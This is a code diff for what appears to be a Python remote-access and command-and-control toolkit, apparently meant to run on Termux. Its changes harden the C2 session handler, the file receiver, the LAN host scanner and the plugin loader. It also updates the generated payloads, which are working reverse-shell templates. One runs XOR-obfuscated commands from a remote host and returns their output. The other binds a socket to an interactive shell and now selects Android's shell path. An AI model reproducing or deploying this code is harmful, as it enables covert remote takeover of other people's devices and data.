@@ -8,7 +8,7 @@ try:
 except ImportError:
     _TERMIOS = False
 
-VERSION = "0.3.2"
+VERSION = "0.3.3"
 ROOT = os.path.dirname(os.path.abspath(__file__))
 DATA = os.path.join(ROOT, "data"); os.makedirs(DATA, exist_ok=True)
 CFG = os.path.join(ROOT, "config.json")
@@ -38,6 +38,7 @@ def save(kind, target, data):
 
 def show(kind=None, limit=30):
     with sqlite3.connect(DB) as c:
+        c.execute("CREATE TABLE IF NOT EXISTS rs(kind, target, ts, data)")
         q = "SELECT rowid,* FROM rs"
         if kind: q += " WHERE kind=?"
         q += " ORDER BY rowid DESC LIMIT ?"
@@ -220,17 +221,22 @@ def mod_c2():
             c2, _ = SESSIONS[current]
             xm = D.get("obfuscate", False)
             send = xor_stream(cmd.encode() + b"\n", 1) if xm else (cmd + "\n").encode()
-            c2.send(send)
+            try:
+                c2.send(send)
+            except OSError:
+                print(f"session {current} dead"); SESSIONS.pop(current, None); current = None; continue
             time.sleep(0.4)
             c2.settimeout(2)
             buf = b""
-            while True:
-                try:
+            try:
+                while True:
                     d = c2.recv(4096)
-                    if not d: break
+                    if not d: raise OSError("closed")
                     buf += d
                     if len(d) < 4096: break
-                except socket.timeout: break
+            except socket.timeout: pass
+            except OSError:
+                SESSIONS.pop(current, None); print(f"session {current} closed"); current = None; continue
             c2.settimeout(None)
             if buf:
                 out = xor_stream(buf, 2) if xm else buf
@@ -314,10 +320,14 @@ def mod_recv():
     srv.bind(("", port)); srv.listen(1)
     print(f"listening 0.0.0.0:{port}...")
     c, _ = srv.accept()
+    c.settimeout(15)
     meta = b""
-    while b"\n" not in meta: meta += c.recv(1)
+    while b"\n" not in meta:
+        d = c.recv(1)
+        if not d: print("client disconnected before meta"); c.close(); srv.close(); return
     name, size = meta.decode().strip().split("|"); size = int(size)
     c.send(b"K")
+    name = os.path.basename(name)
     dest = os.path.join(DATA, name); got = 0
     with open(dest, "wb") as f:
         while got < size:
@@ -340,21 +350,12 @@ def mod_payload():
 import socket,subprocess,os,time
 HOST,PORT="{host}",{port}
 def x(b,k): return bytes((x^(i+k)&0xFF for i,x in enumerate(b)))
-def r(s): d=b""
- while 1:
-  try:
-   x=s.recv(4096)
-   if not x: break
-   d+=x
-   if len(x)<4096: break
-  except: break
- return d
 while True:
     try:
         s=socket.socket();s.connect((HOST,int(PORT)))
         while 1:
             cmd=s.recv(4096)
-            if not cmd:break
+            if not cmd: break
             c=subprocess.run(x(cmd,1).decode(errors="ignore").strip(),shell=True,capture_output=True,text=True)
             s.sendall(x((c.stdout+c.stderr).encode()+b"\\n",2))
     except Exception: pass
@@ -364,11 +365,12 @@ while True:
         p = f'''#!/usr/bin/env python3
 import socket,subprocess,os,time
 HOST,PORT="{host}",{int(port)}
+SH = "/system/bin/sh" if os.path.exists("/system/bin/sh") else ("/bin/sh" if os.path.exists("/bin/sh") else "sh")
 while True:
     try:
         s=socket.socket();s.connect((HOST,int(PORT)))
         os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
-        subprocess.call(["/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
+        subprocess.call([SH,"-i"])
         s.close()
     except Exception: pass
     time.sleep(5)
@@ -405,8 +407,12 @@ def mod_discover():
             except OSError: pass
             finally: s.close()
     ts = [threading.Thread(target=ping, args=(x,)) for x in ips]
-    for t in ts: t.start()
-    for t in ts: t.join()
+    # batch 64 threads — spawning 254 at once on Termux will DoS the phone
+    pos = 0
+    while pos < len(ts):
+        for t in ts[pos:pos+64]: t.start()
+        for t in ts[pos:pos+64]: t.join()
+        pos += 64
     print(f"up ({len(found)}): {sorted(found) or 'none'}")
     if found: save("lan", cidr, f"up={sorted(found)}")
 
@@ -575,6 +581,10 @@ def load_plugins():
             spec = importlib.util.spec_from_file_location("plg_" + fn[:-3], path)
             m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
             if hasattr(m, "PLUGIN") and isinstance(m.PLUGIN, dict):
+                for k in list(m.PLUGIN):
+                    if k in MODULES:
+                        print(f"[plugin] {fn}: key '{k}' shadows builtin — skipped")
+                        del m.PLUGIN[k]
                 MODULES.update(m.PLUGIN)
                 _PLUGIN_KEYS |= set(m.PLUGIN)
                 print(f"[plugin] loaded {fn}: {list(m.PLUGIN)}")
